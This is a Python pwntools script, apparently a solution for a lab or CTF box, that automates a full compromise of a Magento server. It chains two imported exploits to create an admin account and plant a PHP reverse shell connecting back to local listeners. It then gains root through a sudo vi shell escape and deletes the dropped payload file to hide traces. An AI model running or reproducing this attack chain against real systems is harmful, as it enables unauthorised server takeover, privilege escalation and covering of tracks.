from pwn import *
import e37977, e37811, threading, random, string

p = log.progress("Executing Stage 1: Create Admin Account on Magento through E37977...")
if not e37977.run():
 log.error("Could not create account, are you sure the machine is up?")
p.success("Done")

p=log.progress("Deploying stage 2: Deploy PHP Reverse Shell through E37811...")
p.status("Start local server")
shsrv = listen(42069)
p.status("Requesting file remotely")
ethread = threading.Thread(target=e37811.run)
ethread.daemon = True
ethread.start()
p.status("Waiting for connetion")
shsrv.wait_for_connection()
p.status("Sending payload")
payload = open("rsh.php","rb").read()
shsrv.send(payload)
shsrv.close()
p.success("Done")

rshell = listen(6969)
rshell.wait_for_connection()
fn = "".join(random.choice(string.ascii_lowercase) for x in range(10))
p=log.progress("Executing stage 3: vi sudo gtfobin...")
rshell.sendline("sudo -S /usr/bin/vi /var/www/html/"+fn+" -c ':!/bin/sh'")
p.status("Waiting for Shell")
rshell.recvuntil("\x31\x48\x0d\x0a")
p.success("Done")
p=log.progress("Deleting all intermittent stages...")
rshell.sendline("rm /tmp/rsh.php")
p.success("Done")
log.success("Welcome to your root shell, exit with ctrl+c:")
rshell.sendline("echo \"Logged in as $(whoami)\"")
rshell.interactive()


